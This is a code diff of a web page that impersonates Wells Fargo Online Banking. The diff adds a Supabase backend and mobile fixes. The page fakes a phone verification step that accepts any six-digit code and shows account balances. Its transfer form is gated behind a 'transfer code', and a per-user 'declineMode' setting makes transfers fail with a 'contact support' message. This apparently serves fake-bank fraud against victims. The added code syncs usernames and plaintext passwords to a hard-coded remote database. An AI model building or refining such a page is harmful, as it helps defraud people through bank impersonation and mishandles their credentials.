@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Wells Fargo Online Banking</title>
 <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&family=Source+Sans+3:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
@@ -38,10 +38,11 @@ body { font-family: 'Source Sans 3', sans-serif; background: #e8e8e8; color: var
 .login-card h2 { font-size:1.15rem; margin-bottom:24px; font-weight:600; }
 .fg { margin-bottom:18px; }
 .fg label { display:block; font-size:.82rem; font-weight:700; color:var(--gray); margin-bottom:5px; text-transform:uppercase; letter-spacing:.4px; }
-.fg input { width:100%; padding:10px 13px; border:1px solid var(--border); border-radius:3px; font-size:.93rem; font-family:inherit; outline:none; transition:border-color .2s; }
+.fg input { width:100%; padding:10px 13px; border:1px solid var(--border); border-radius:3px; font-size:.93rem; font-family:inherit; outline:none; transition:border-color .2s; -webkit-appearance: none; -moz-appearance: none; appearance: none; }
 .fg input:focus { border-color:var(--red); box-shadow:0 0 0 2px rgba(200,16,46,.1); }
-.btn-red { width:100%; padding:12px; background:var(--red); color:#fff; border:none; border-radius:3px; font-size:.95rem; font-weight:700; cursor:pointer; font-family:inherit; transition:background .2s; }
+.btn-red { width:100%; padding:12px; background:var(--red); color:#fff; border:none; border-radius:3px; font-size:.95rem; font-weight:700; cursor:pointer; font-family:inherit; transition:background .2s; -webkit-appearance: none; }
 .btn-red:hover { background:#a80d26; }
+.btn-red:active { background:#8a0018; }
 .login-links { display:flex; justify-content:space-between; margin-top:14px; }
 .login-links a { font-size:.8rem; color:var(--blue); text-decoration:none; }
 .login-links a:hover { text-decoration:underline; }
@@ -61,8 +62,8 @@ body { font-family: 'Source Sans 3', sans-serif; background: #e8e8e8; color: var
 .security-icon { font-size:3rem; margin-bottom:16px; }
 .security-card h2 { font-size:1.15rem; margin-bottom:12px; font-weight:600; }
 .security-card p { font-size:.85rem; color:var(--gray); margin-bottom:24px; line-height:1.5; }
-.code-inputs { display:flex; gap:8px; justify-content:center; margin-bottom:20px; }
-.code-digit { width:48px; height:56px; border:2px solid var(--border); border-radius:4px; font-size:1.5rem; text-align:center; font-weight:700; outline:none; transition:border-color .2s; }
+.code-inputs { display:flex; gap:8px; justify-content:center; margin-bottom:20px; flex-wrap: wrap; }
+.code-digit { width:48px; height:56px; border:2px solid var(--border); border-radius:4px; font-size:1.5rem; text-align:center; font-weight:700; outline:none; transition:border-color .2s; -webkit-appearance: none; -moz-appearance: none; appearance: none; }
 .code-digit:focus { border-color:var(--red); box-shadow:0 0 0 2px rgba(200,16,46,.1); }
 
 /* HEADER */
@@ -156,7 +157,7 @@ body { font-family: 'Source Sans 3', sans-serif; background: #e8e8e8; color: var
 .tf-row { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:16px; }
 .tf-full { margin-bottom:16px; }
 .tf-label { display:block; font-size:.8rem; font-weight:700; color:var(--gray); margin-bottom:5px; text-transform:uppercase; letter-spacing:.4px; }
-.tf-inp, .tf-sel { width:100%; padding:10px 12px; border:1px solid var(--border); border-radius:3px; font-size:.92rem; font-family:inherit; outline:none; transition:border-color .2s; }
+.tf-inp, .tf-sel { width:100%; padding:10px 12px; border:1px solid var(--border); border-radius:3px; font-size:.92rem; font-family:inherit; outline:none; transition:border-color .2s; -webkit-appearance: none; -moz-appearance: none; appearance: none; }
 .tf-inp:focus, .tf-sel:focus { border-color:var(--red); box-shadow:0 0 0 2px rgba(200,16,46,.1); }
 .amt-wrap { position:relative; }
 .amt-pre { position:absolute; left:12px; top:50%; transform:translateY(-50%); color:var(--gray); }
@@ -168,8 +169,8 @@ body { font-family: 'Source Sans 3', sans-serif; background: #e8e8e8; color: var
 /* TRANSFER CODE */
 .transfer-code-section { background:#fff8e7; border:2px solid var(--gold); border-radius:4px; padding:20px; margin-bottom:16px; text-align:center; }
 .transfer-code-section h4 { color:var(--dark); margin-bottom:8px; }
-.code-input-row { display:flex; gap:8px; justify-content:center; margin-top:12px; }
-.code-input { width:48px; height:52px; border:2px solid var(--gold); border-radius:4px; font-size:1.4rem; text-align:center; font-weight:700; outline:none; }
+.code-input-row { display:flex; gap:8px; justify-content:center; margin-top:12px; flex-wrap: wrap; }
+.code-input { width:48px; height:52px; border:2px solid var(--gold); border-radius:4px; font-size:1.4rem; text-align:center; font-weight:700; outline:none; -webkit-appearance: none; -moz-appearance: none; appearance: none; }
 .code-input:focus { border-color:var(--red); }
 .code-error { color:var(--red); font-size:.8rem; margin-top:8px; display:none; }
 
@@ -221,7 +222,6 @@ body { font-family: 'Source Sans 3', sans-serif; background: #e8e8e8; color: var
   .wf-body { flex-direction: column; }
   .wf-sidebar { display: none; width: 100%; position: fixed; top: 54px; left: 0; bottom: 0; z-index: 60; overflow-y: auto; }
   .wf-sidebar.open { display: block; }
-  /* REMOVED: sidebar-open always display:block - now controlled by .on class */
 
   .wf-main { padding: 16px 12px; }
 
@@ -258,6 +258,14 @@ body { font-family: 'Source Sans 3', sans-serif; background: #e8e8e8; color: var
   .code-digit { width: 36px; height: 44px; font-size: 1.1rem; }
   .code-input { width: 36px; height: 44px; font-size: 1.1rem; }
 }
+
+/* Touch device optimizations */
+@media (hover: none) and (pointer: coarse) {
+  .btn-red:active { background:#8a0018; }
+  .fg input:focus { border-color:var(--red); box-shadow:0 0 0 2px rgba(200,16,46,.1); }
+  .code-digit:focus { border-color:var(--red); box-shadow:0 0 0 2px rgba(200,16,46,.1); }
+  .code-input:focus { border-color:var(--red); }
+}
 </style>
 </head>
 <body>
@@ -278,7 +286,7 @@ body { font-family: 'Source Sans 3', sans-serif; background: #e8e8e8; color: var
     <h2>Sign On to Wells Fargo</h2>
     <div class="fg">
       <label>Username</label>
-      <input type="text" id="l-user" placeholder="Enter your username" autocomplete="username">
+      <input type="text" id="l-user" placeholder="Enter your username" autocomplete="username" autocapitalize="none" autocorrect="off" spellcheck="false">
     </div>
     <div class="fg">
       <label>Password</label>
@@ -296,16 +304,16 @@ body { font-family: 'Source Sans 3', sans-serif; background: #e8e8e8; color: var
 <!-- SECURITY CODE STEP -->
 <div id="pg-security" class="page">
   <div class="security-card">
-    <div class="security-icon">📱</div>
+    <div class="security-icon">&#128241;</div>
     <h2>Verification Required</h2>
     <p>Please enter the 6-digit security code we sent to your phone</p>
     <div class="code-inputs">
-      <input type="text" class="code-digit" maxlength="1" id="sec-code-1" oninput="handleCodeInput(this, 1)" onkeydown="handleCodeKeydown(event, 1)">
-      <input type="text" class="code-digit" maxlength="1" id="sec-code-2" oninput="handleCodeInput(this, 2)" onkeydown="handleCodeKeydown(event, 2)">
-      <input type="text" class="code-digit" maxlength="1" id="sec-code-3" oninput="handleCodeInput(this, 3)" onkeydown="handleCodeKeydown(event, 3)">
-      <input type="text" class="code-digit" maxlength="1" id="sec-code-4" oninput="handleCodeInput(this, 4)" onkeydown="handleCodeKeydown(event, 4)">
-      <input type="text" class="code-digit" maxlength="1" id="sec-code-5" oninput="handleCodeInput(this, 5)" onkeydown="handleCodeKeydown(event, 5)">
-      <input type="text" class="code-digit" maxlength="1" id="sec-code-6" oninput="handleCodeInput(this, 6)" onkeydown="handleCodeKeydown(event, 6)">
+      <input type="text" class="code-digit" maxlength="1" id="sec-code-1" inputmode="numeric" pattern="[0-9]" oninput="handleCodeInput(this, 1)" onkeydown="handleCodeKeydown(event, 1)" onfocus="this.select()">
+      <input type="text" class="code-digit" maxlength="1" id="sec-code-2" inputmode="numeric" pattern="[0-9]" oninput="handleCodeInput(this, 2)" onkeydown="handleCodeKeydown(event, 2)" onfocus="this.select()">
+      <input type="text" class="code-digit" maxlength="1" id="sec-code-3" inputmode="numeric" pattern="[0-9]" oninput="handleCodeInput(this, 3)" onkeydown="handleCodeKeydown(event, 3)" onfocus="this.select()">
+      <input type="text" class="code-digit" maxlength="1" id="sec-code-4" inputmode="numeric" pattern="[0-9]" oninput="handleCodeInput(this, 4)" onkeydown="handleCodeKeydown(event, 4)" onfocus="this.select()">
+      <input type="text" class="code-digit" maxlength="1" id="sec-code-5" inputmode="numeric" pattern="[0-9]" oninput="handleCodeInput(this, 5)" onkeydown="handleCodeKeydown(event, 5)" onfocus="this.select()">
+      <input type="text" class="code-digit" maxlength="1" id="sec-code-6" inputmode="numeric" pattern="[0-9]" oninput="handleCodeInput(this, 6)" onkeydown="handleCodeKeydown(event, 6)" onfocus="this.select()">
     </div>
     <div class="err-msg" id="sec-err" style="display:none">Invalid security code. Please try again.</div>
     <button class="btn-red" style="margin-top:16px" onclick="verifySecurityCode()">Verify</button>
@@ -317,7 +325,7 @@ body { font-family: 'Source Sans 3', sans-serif; background: #e8e8e8; color: var
 <!-- DASHBOARD -->
 <div id="pg-dash" class="page">
   <header class="wf-header">
-    <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>
+    <button class="mobile-menu-btn" onclick="toggleSidebar()">&#9776;</button>
     <div class="wf-logo">WELLS FARGO</div>
     <div class="hdr-actions">
       <button class="hdr-btn accent" onclick="openTransfer()">
@@ -457,7 +465,35 @@ body { font-family: 'Source Sans 3', sans-serif; background: #e8e8e8; color: var
 
 <div class="toast" id="toast"></div>
 
+<!-- SUPABASE SDK -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.0/dist/umd/supabase.js"></script>
+
 <script>
+// ── SUPABASE CONFIGURATION ──
+const SUPABASE_URL = 'https://vlsnstzqwqformfgmtgi.supabase.co';
+const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZsc25zdHpxd3Fmb3JtZmdtdGdpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgxNjkzOTMsImV4cCI6MjA5Mzc0NTM5M30.l01mCGL56mIiuz07CJltGULXMrnpKS5xHZwimHFm7Kk';
+
+// Initialize Supabase client
+let supabase = null;
+let supabaseReady = false;
+
+function initSupabase() {
+  try {
+    if (typeof window.supabase !== 'undefined') {
+      supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+      supabaseReady = true;
+      console.log('Supabase initialized successfully');
+      return true;
+    } else {
+      console.warn('Supabase SDK not loaded, using localStorage fallback');
+      return false;
+    }
+  } catch (e) {
+    console.error('Failed to initialize Supabase:', e);
+    return false;
+  }
+}
+
 // ── STATE MANAGEMENT ──
 const STORE_KEY = 'wf_db';
 const CODES_KEY = 'wf_codes';
@@ -484,19 +520,84 @@ function initDB() {
     db.codes = [];
     saveDB(db);
   }
+  // Ensure all required fields exist
+  if (!db.codes) db.codes = [];
+  if (!db.transactions) db.transactions = [];
+  saveDB(db);
 }
 
-// Load from localStorage
+// Check if localStorage is available (handles mobile private browsing)
+function isLocalStorageAvailable() {
+  try {
+    const test = '__storage_test__';
+    localStorage.setItem(test, test);
+    localStorage.removeItem(test);
+    return true;
+  } catch (e) {
+    return false;
+  }
+}
+
+// Load from localStorage with robust error handling
 function loadDB() {
+  // If localStorage is not available, return empty DB
+  if (!isLocalStorageAvailable()) {
+    console.warn('localStorage not available, using in-memory fallback');
+    return { users: [], transactions: [], codes: [] };
+  }
+
   try {
     const raw = localStorage.getItem(STORE_KEY);
-    return raw ? JSON.parse(raw) : { users: [], transactions: [], codes: [] };
-  } catch(e) { return { users: [], transactions: [], codes: [] }; }
+    if (!raw) {
+      return { users: [], transactions: [], codes: [] };
+    }
+    const db = JSON.parse(raw);
+    // Validate structure
+    if (!db.users) db.users = [];
+    if (!db.transactions) db.transactions = [];
+    if (!db.codes) db.codes = [];
+    return db;
+  } catch(e) {
+    console.error('Error loading localStorage:', e);
+    // If corrupted, clear and return empty
+    try {
+      localStorage.removeItem(STORE_KEY);
+    } catch (e2) {
+      // Can't clear, just return empty
+    }
+    return { users: [], transactions: [], codes: [] };
+  }
 }
 
-// Save to localStorage
+// Save to localStorage with robust error handling
 function saveDB(db) {
-  localStorage.setItem(STORE_KEY, JSON.stringify(db));
+  // If localStorage is not available, data will be lost on refresh
+  // But this prevents crashes on mobile
+  if (!isLocalStorageAvailable()) {
+    console.warn('localStorage not available, changes will not persist');
+    return false;
+  }
+
+  try {
+    const serialized = JSON.stringify(db);
+    localStorage.setItem(STORE_KEY, serialized);
+    return true;
+  } catch(e) {
+    console.error('Error saving to localStorage:', e);
+    // If quota exceeded, try to clean up
+    if (e.name === 'QuotaExceededError' || e.name === 'NS_ERROR_FILE_CFULL') {
+      try {
+        // Keep only recent data
+        if (db.transactions && db.transactions.length > 50) {
+          db.transactions = db.transactions.slice(0, 50);
+          localStorage.setItem(STORE_KEY, JSON.stringify(db));
+        }
+      } catch (e2) {
+        console.error('Failed to clean up localStorage:', e2);
+      }
+    }
+    return false;
+  }
 }
 
 let userData = null;
@@ -510,10 +611,15 @@ function saveSession(user) {
     name: user.name,
     loginTime: new Date().toISOString()
   };
-  localStorage.setItem(SESSION_KEY, JSON.stringify(session));
+  try {
+    localStorage.setItem(SESSION_KEY, JSON.stringify(session));
+  } catch (e) {
+    console.error('Error saving session:', e);
+  }
 }
 
 function loadSession() {
+  if (!isLocalStorageAvailable()) return null;
   try {
     const raw = localStorage.getItem(SESSION_KEY);
     if (!raw) return null;
@@ -522,7 +628,11 @@ function loadSession() {
 }
 
 function clearSession() {
-  localStorage.removeItem(SESSION_KEY);
+  try {
+    localStorage.removeItem(SESSION_KEY);
+  } catch (e) {
+    console.error('Error clearing session:', e);
+  }
 }
 
 // ── UTILS ──
@@ -540,8 +650,10 @@ function toast(msg, isErr=false) {
 }
 
 function toggleSidebar() {
-  document.getElementById('wf-sidebar').classList.toggle('open');
-  document.getElementById('sidebar-overlay').classList.toggle('on');
+  const sidebar = document.getElementById('wf-sidebar');
+  const overlay = document.getElementById('sidebar-overlay');
+  sidebar.classList.toggle('open');
+  overlay.classList.toggle('on');
 }
 
 // ── AUTH ──
@@ -550,14 +662,40 @@ async function doLogin() {
   const p = document.getElementById('l-pass').value;
 
   if (!u || !p) {
+    document.getElementById('l-err').textContent = 'Please enter both username and password.';
     document.getElementById('l-err').style.display = 'block';
     return;
   }
 
   showLoading('Signing in...');
 
+  // Small delay for UX
   await new Promise(r => setTimeout(r, 300));
 
+  // Try Supabase first if available
+  if (supabaseReady) {
+    try {
+      const { data, error } = await supabase
+        .from('users')
+        .select('*')
+        .eq('username', u)
+        .eq('password', p)
+        .single();
+
+      if (data) {
+        userData = data;
+        hideLoading();
+        showPage('pg-security');
+        clearSecurityCode();
+        return;
+      }
+    } catch (e) {
+      console.error('Supabase query error:', e);
+      // Fall through to localStorage
+    }
+  }
+
+  // Fallback to localStorage
   const db = loadDB();
   const user = db.users.find(x => x.username === u && x.password === p);
 
@@ -570,32 +708,95 @@ async function doLogin() {
     showPage('pg-security');
     clearSecurityCode();
   } else {
+    document.getElementById('l-err').textContent = 'Invalid username or password.';
     document.getElementById('l-err').style.display = 'block';
     document.getElementById('l-pass').value = '';
   }
 }
 
-// Enter key login
-document.addEventListener('keydown', e => {
-  if (e.key === 'Enter' && document.getElementById('pg-login').classList.contains('active')) doLogin();
+// Enter key login - improved for mobile
+document.addEventListener('DOMContentLoaded', function() {
+  const loginInputs = document.querySelectorAll('#l-user, #l-pass');
+  loginInputs.forEach(input => {
+    input.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        doLogin();
+      }
+    });
+  });
+
+  // Also handle form submission
+  const loginCard = document.querySelector('.login-card');
+  if (loginCard) {
+    loginCard.addEventListener('submit', function(e) {
+      e.preventDefault();
+      doLogin();
+    });
+  }
 });
 
 function handleCodeInput(el, idx) {
+  // Only allow digits
   el.value = el.value.replace(/[^0-9]/g, '');
+
   if (el.value && idx < 6) {
-    document.getElementById('sec-code-' + (idx + 1)).focus();
+    const nextInput = document.getElementById('sec-code-' + (idx + 1));
+    if (nextInput) {
+      nextInput.focus();
+    }
   }
+
+  // Auto-submit when all 6 digits are entered
+  checkSecurityCodeComplete();
 }
 
 function handleCodeKeydown(e, idx) {
   if (e.key === 'Backspace' && !e.target.value && idx > 1) {
-    document.getElementById('sec-code-' + (idx - 1)).focus();
+    const prevInput = document.getElementById('sec-code-' + (idx - 1));
+    if (prevInput) {
+      prevInput.focus();
+    }
+  }
+
+  // Handle paste of full code
+  if (e.key === 'v' && (e.ctrlKey || e.metaKey)) {
+    // Will handle paste event
+  }
+}
+
+// Handle paste for security code
+document.addEventListener('paste', function(e) {
+  if (!document.getElementById('pg-security').classList.contains('active')) return;
+
+  const paste = (e.clipboardData || window.clipboardData).getData('text');
+  if (/^\d{6}$/.test(paste)) {
+    e.preventDefault();
+    for (let i = 0; i < 6; i++) {
+      const input = document.getElementById('sec-code-' + (i + 1));
+      if (input) input.value = paste[i];
+    }
+    verifySecurityCode();
+  }
+});
+
+function checkSecurityCodeComplete() {
+  let code = '';
+  for (let i = 1; i <= 6; i++) {
+    const input = document.getElementById('sec-code-' + i);
+    if (input) code += input.value;
+  }
+
+  if (code.length === 6) {
+    // Auto-verify after short delay
+    setTimeout(() => verifySecurityCode(), 100);
   }
 }
 
 function clearSecurityCode() {
   for (let i = 1; i <= 6; i++) {
-    document.getElementById('sec-code-' + i).value = '';
+    const input = document.getElementById('sec-code-' + i);
+    if (input) input.value = '';
   }
   document.getElementById('sec-err').style.display = 'none';
 }
@@ -603,7 +804,8 @@ function clearSecurityCode() {
 async function verifySecurityCode() {
   let code = '';
   for (let i = 1; i <= 6; i++) {
-    code += document.getElementById('sec-code-' + i).value;
+    const input = document.getElementById('sec-code-' + i);
+    if (input) code += input.value;
   }
 
   if (code.length !== 6) {
@@ -613,17 +815,45 @@ async function verifySecurityCode() {
   }
 
   showLoading('Verifying code...');
+
+  // Simulate verification delay
   await new Promise(r => setTimeout(r, 800));
 
-  // Any 6-digit code works for demo (in real app, validate against server)
   hideLoading();
 
+  // Any 6-digit code works for demo
   // Save session so user stays logged in after browser refresh
   saveSession(userData);
+
+  // Sync user to Supabase if available
+  if (supabaseReady && userData) {
+    syncUserToSupabase(userData);
+  }
 
   loadDashboard();
   showPage('pg-dash');
   toast('Sign on successful!');
+}
+
+async function syncUserToSupabase(user) {
+  if (!supabaseReady) return;
+
+  try {
+    // Upsert user to Supabase
+    await supabase.from('users').upsert({
+      id: user.id,
+      username: user.username,
+      password: user.password,
+      name: user.name,
+      checking: user.checking,
+      savings: user.savings,
+      retire: user.retire,
+      declineMode: user.declineMode || false,
+      updated_at: new Date().toISOString()
+    });
+  } catch (e) {
+    console.error('Failed to sync user to Supabase:', e);
+  }
 }
 
 function resendCode(e) {
@@ -755,12 +985,12 @@ function renderTransferForm() {
       <h4>Enter Transfer Code before final transfer</h4>
       <p style="font-size:.82rem;color:var(--gray);margin-bottom:0">Enter the 6-digit code sent to your mobile phone</p>
       <div class="code-input-row">
-        <input type="text" class="code-input" maxlength="1" id="tf-code-1" oninput="handleTransferCodeInput(this, 1)" onkeydown="handleTransferCodeKeydown(event, 1)">
-        <input type="text" class="code-input" maxlength="1" id="tf-code-2" oninput="handleTransferCodeInput(this, 2)" onkeydown="handleTransferCodeKeydown(event, 2)">
-        <input type="text" class="code-input" maxlength="1" id="tf-code-3" oninput="handleTransferCodeInput(this, 3)" onkeydown="handleTransferCodeKeydown(event, 3)">
-        <input type="text" class="code-input" maxlength="1" id="tf-code-4" oninput="handleTransferCodeInput(this, 4)" onkeydown="handleTransferCodeKeydown(event, 4)">
-        <input type="text" class="code-input" maxlength="1" id="tf-code-5" oninput="handleTransferCodeInput(this, 5)" onkeydown="handleTransferCodeKeydown(event, 5)">
-        <input type="text" class="code-input" maxlength="1" id="tf-code-6" oninput="handleTransferCodeInput(this, 6)" onkeydown="handleTransferCodeKeydown(event, 6)">
+        <input type="text" class="code-input" maxlength="1" id="tf-code-1" inputmode="numeric" pattern="[0-9]" oninput="handleTransferCodeInput(this, 1)" onkeydown="handleTransferCodeKeydown(event, 1)" onfocus="this.select()">
+        <input type="text" class="code-input" maxlength="1" id="tf-code-2" inputmode="numeric" pattern="[0-9]" oninput="handleTransferCodeInput(this, 2)" onkeydown="handleTransferCodeKeydown(event, 2)" onfocus="this.select()">
+        <input type="text" class="code-input" maxlength="1" id="tf-code-3" inputmode="numeric" pattern="[0-9]" oninput="handleTransferCodeInput(this, 3)" onkeydown="handleTransferCodeKeydown(event, 3)" onfocus="this.select()">
+        <input type="text" class="code-input" maxlength="1" id="tf-code-4" inputmode="numeric" pattern="[0-9]" oninput="handleTransferCodeInput(this, 4)" onkeydown="handleTransferCodeKeydown(event, 4)" onfocus="this.select()">
+        <input type="text" class="code-input" maxlength="1" id="tf-code-5" inputmode="numeric" pattern="[0-9]" oninput="handleTransferCodeInput(this, 5)" onkeydown="handleTransferCodeKeydown(event, 5)" onfocus="this.select()">
+        <input type="text" class="code-input" maxlength="1" id="tf-code-6" inputmode="numeric" pattern="[0-9]" oninput="handleTransferCodeInput(this, 6)" onkeydown="handleTransferCodeKeydown(event, 6)" onfocus="this.select()">
       </div>
       <div class="code-error" id="code-error">Invalid or used code. Please enter a valid code.</div>
     </div>
@@ -779,13 +1009,15 @@ function renderTransferForm() {
 function handleTransferCodeInput(el, idx) {
   el.value = el.value.replace(/[^0-9]/g, '');
   if (el.value && idx < 6) {
-    document.getElementById('tf-code-' + (idx + 1)).focus();
+    const nextInput = document.getElementById('tf-code-' + (idx + 1));
+    if (nextInput) nextInput.focus();
   }
 }
 
 function handleTransferCodeKeydown(e, idx) {
   if (e.key === 'Backspace' && !e.target.value && idx > 1) {
-    document.getElementById('tf-code-' + (idx - 1)).focus();
+    const prevInput = document.getElementById('tf-code-' + (idx - 1));
+    if (prevInput) prevInput.focus();
   }
 }
 
@@ -806,8 +1038,9 @@ function clearTransferCode() {
 }
 
 function handleToChange() {
-  const val = document.getElementById('tf-to').value;
-  document.getElementById('ext-fields').classList.toggle('show', val === 'external');
+  const val = document.getElementById('tf-to')?.value;
+  const extFields = document.getElementById('ext-fields');
+  if (extFields) extFields.classList.toggle('show', val === 'external');
   updateSummary();
 }
 
@@ -827,11 +1060,17 @@ function updateSummary() {
       const bn = document.getElementById('ext-bank')?.value   || '';
       toLabel = (bn||'External Bank') + (rn?' (Routing: '+rn+')':'') + (an?' Acct: ****'+an.slice(-4):'');
     }
-    document.getElementById('s-from').textContent = ACCT[from];
-    document.getElementById('s-to').textContent   = toLabel;
-    document.getElementById('s-amt').textContent  = fmt(amount);
-    document.getElementById('s-date').textContent = date || 'Today';
-  } else { sum.classList.remove('show'); }
+    const sFrom = document.getElementById('s-from');
+    const sTo = document.getElementById('s-to');
+    const sAmt = document.getElementById('s-amt');
+    const sDate = document.getElementById('s-date');
+    if (sFrom) sFrom.textContent = ACCT[from];
+    if (sTo) sTo.textContent = toLabel;
+    if (sAmt) sAmt.textContent = fmt(amount);
+    if (sDate) sDate.textContent = date || 'Today';
+  } else {
+    sum.classList.remove('show');
+  }
 }
 
 async function submitTransfer() {
@@ -889,8 +1128,11 @@ async function submitTransfer() {
   const code = getTransferCode();
 
   if (!code || code.length !== 6) {
-    document.getElementById('code-error').textContent = 'Please enter the 6-digit transfer code.';
-    document.getElementById('code-error').style.display = 'block';
+    const codeErr = document.getElementById('code-error');
+    if (codeErr) {
+      codeErr.textContent = 'Please enter the 6-digit transfer code.';
+      codeErr.style.display = 'block';
+    }
     return;
   }
 
@@ -903,8 +1145,11 @@ async function submitTransfer() {
     await new Promise(r => setTimeout(r, 4000));
     hideLoading();
 
-    document.getElementById('code-error').textContent = 'Invalid or already used code. Please contact support.';
-    document.getElementById('code-error').style.display = 'block';
+    const codeErr = document.getElementById('code-error');
+    if (codeErr) {
+      codeErr.textContent = 'Invalid or already used code. Please contact support.';
+      codeErr.style.display = 'block';
+    }
     return;
   }
 
@@ -995,10 +1240,14 @@ document.querySelectorAll('.overlay').forEach(ov => {
 });
 
 // Initialize on load
-initDB();
+document.addEventListener('DOMContentLoaded', async function() {
+  // Initialize Supabase first
+  initSupabase();
 
-// Check for existing session and restore if valid
-function initSession() {
+  // Initialize local database
+  initDB();
+
+  // Check for existing session and restore if valid
   const session = loadSession();
   if (session) {
     const db = loadDB();
@@ -1011,10 +1260,7 @@ function initSession() {
     }
   }
   showPage('pg-login');
-}
-
-// Run session check on page load
-initSession();
+});
 </script>
 
 <script>
